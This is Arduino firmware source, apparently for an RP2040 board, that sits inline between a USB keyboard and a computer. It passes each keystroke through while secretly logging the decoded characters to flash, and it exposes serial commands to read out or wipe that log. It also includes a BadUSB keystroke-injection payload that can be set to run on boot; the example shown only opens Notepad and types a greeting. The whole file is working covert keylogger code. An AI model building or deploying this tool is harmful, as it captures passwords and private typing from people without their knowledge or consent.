#include <HIDKeyboard.h>
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"

// ======================================= Define and Variables =============================================

#define HOST_PIN_DP   19
#define BUFFER_SIZE 64
#define INACTIVITY_TIMEOUT_MS 2000
#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

extern const uint8_t _asciimap[] PROGMEM;

Adafruit_USBH_Host USBHost;
tusb_desc_device_t desc_device;

char keyBuffer[BUFFER_SIZE];
static uint8_t mod = 0;
uint8_t modifiersard=0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;
uint8_t c = 0;
uint8_t bufferIndex = 0;
unsigned long lastKeyTime = 0;

uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };


// ====================================== Bad USB ===============================================


void payload() {
  // Example Payload - modify this as needed.
  delay(2000);
  // key press
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  // keys release (for multi keypresses)
  Keyboard.releaseAll();
  delay(1500);
  // print string
  Keyboard.print("notepad");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  // print string + return
  Keyboard.println("Hello World!");
}


bool getPayloadRunState() {
    File file = LittleFS.open("/payload_state.txt", "r");
    if (!file) {
        Serial.println("No saved payload state found. Defaulting to OFF.");
        return false; 
    }
    String state = file.readString();
    file.close();
    state.trim();
    return (state == "ON");
}

void savePayloadRunState(bool state) {
    File file = LittleFS.open("/payload_state.txt", "w");
    if (file) {
        file.println(state ? "ON" : "OFF");
        file.close();
    } else {
        Serial.println("Failed to save payload run state.");
    }
}

void payloadOnBootON() {
    savePayloadRunState(true);
    Serial.println("Payload will run on boot.");
}

void payloadOnBootOFF() {
    savePayloadRunState(false);
    Serial.println("Payload will NOT run on boot.");
}


// ======================================= Buffer Functions =============================================

void openLogFile() {
    File f = LittleFS.open("/keys.txt", "a");
    if (!f) {
        Serial.println("Error opening log file");
    }
}

void writeBufferedKey(char key) {
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = key;
        lastKeyTime = millis(); 
    } else {
        flushBuffer();
    }
}

void flushBuffer() {
  File f = LittleFS.open("/keys.txt", "a");
    if (bufferIndex > 0 && f) {
        f.write((const uint8_t*)keyBuffer, bufferIndex);
        f.flush();
        bufferIndex = 0;
    }
}

void closeLogFile() {
    flushBuffer();
    File f = LittleFS.open("/keys.txt", "a");
    if (f) {
        f.close();
    }
}

void checkInactivity() {
    if (bufferIndex > 0 && (millis() - lastKeyTime > INACTIVITY_TIMEOUT_MS)) {
        flushBuffer();
    }
}



void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  Keyboard.begin();
  delay(1000);
  
    if (getPayloadRunState()) {
        Serial.println("Running payload...");
        payload();
    } else {
        Serial.println("Payload is disabled on boot.");
    }
  
}

void loop() { 
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command == "read") {
      readLogFile();
    } else if (command == "clear") {
      clearLogFile();
    } else if (command == "format") {
      formatFS();
    } else if (command == "pobenabled") {
      payloadOnBootON();
    } else if (command == "pobdisabled") {
      payloadOnBootOFF();
    }
  }
  checkInactivity();
}

// ======================================= Serial Functions =============================================

void readLogFile() {
    File i = LittleFS.open("keys.txt", "r");
    delay(200);
    Serial.println("-------- LOGS ----------");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
    Serial.println("------------------------");
    Serial.println("\n");
}


void clearLogFile() {
    File i = LittleFS.open("keys.txt", "w");
    delay(2000);
    if (i) {
      i.write("");
      Serial.println("Log File Deleted: DONE");
      i.close();
    }
}

void formatFS() {
    delay(2000);
    LittleFS.format();
    Serial.println("Formatted FS : DONE");
}


// ======================================= Main Script Setup and Loops =============================================

void setup1() { 
    Serial.println("Core1 setup to run TinyUSB host with pio-usb");  
    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }
    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
}

void loop1() {
    USBHost.task();
}


// ======================================= Setup Host Keyboard =============================================

void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
    static bool reportPending = false;
    if (!reportPending) {
        uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
        if (itf_protocol == HID_ITF_PROTOCOL_KEYBOARD) {
            process_boot_kbd_report((hid_keyboard_report_t const*)report);
        }        
        reportPending = true;
        tuh_hid_receive_report(dev_addr, idx);
        reportPending = false;
    }
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}


// ======================================= Process Keystrokes =============================================

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
    static hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;
    static uint8_t last_pressed_keys[6] = {0};

    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;

      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }
    
    bool current_modifier_state = (report->modifier != 0);
    if (current_modifier_state != prev_modifier_state) {
        if (current_modifier_state) {
            mod = report->modifier;
            modifier_changed = true;
        } else {
            delay(100);
            Keyboard.releaseAll();
            modifier_changed = true;
            mod = 0;
        }
        prev_modifier_state = current_modifier_state;
    }
    
    for (uint8_t i = 0; i < 6; i++) {
        uint8_t key = report->keycode[i];
        if (key) {
            bool already_pressed = false;
            for (uint8_t j = 0; j < 6; j++) {
                if (last_pressed_keys[j] == key) {
                    already_pressed = true;
                    break;
                }
            }
            
            if (!already_pressed) {
                SetModifiersArd();
                key_modifier_layout = key | modifiersard;
                
                for (int i = 0; i < 128; i++) {
                    uint8_t mappedValue = pgm_read_byte(_asciimap + i);
                    
                    if (mappedValue == key_modifier_layout) {
                        char loggedChar = (char)i;
                        bool shiftActive = (mod & MODIFIERKEY_LEFT_SHIFT) || (mod & MODIFIERKEY_RIGHT_SHIFT);
                
                        if (shiftActive && loggedChar >= 'a' && loggedChar <= 'z') {
                            loggedChar = loggedChar - 'a' + 'A';
                        }
                        if (shiftActive) {
                            switch (loggedChar) {
                                case '1': loggedChar = '!'; break;
                                case '2': loggedChar = '@'; break;
                                case '3': loggedChar = '#'; break;
                                case '4': loggedChar = '$'; break;
                                case '5': loggedChar = '%'; break;
                                case '6': loggedChar = '^'; break;
                                case '7': loggedChar = '&'; break;
                                case '8': loggedChar = '*'; break;
                                case '9': loggedChar = '('; break;
                                case '0': loggedChar = ')'; break;
                                case '-': loggedChar = '_'; break;
                                case '=': loggedChar = '+'; break;
                                case '[': loggedChar = '{'; break;
                                case ']': loggedChar = '}'; break;
                                case '\\': loggedChar = '|'; break;
                                case ';': loggedChar = ':'; break;
                                case '\'': loggedChar = '\"'; break;
                                case ',': loggedChar = '<'; break;
                                case '.': loggedChar = '>'; break;
                                case '/': loggedChar = '?'; break;
                            }
                        }
                        writeBufferedKey(loggedChar);
                    }
                } 
                Keyboard.rawpress(key, mod);
            }
        }
    }
    
    for (uint8_t i = 0; i < 6; i++) {
        bool still_pressed = false;
        for (uint8_t j = 0; j < 6; j++) {
            if (report->keycode[j] == last_pressed_keys[i]) {
                still_pressed = true;
                break;
            }
        }
        
        if (!still_pressed && last_pressed_keys[i]) {
            Keyboard.rawrelease(last_pressed_keys[i], mod);
        }
    }
    
    memcpy(last_pressed_keys, report->keycode, 6);
}
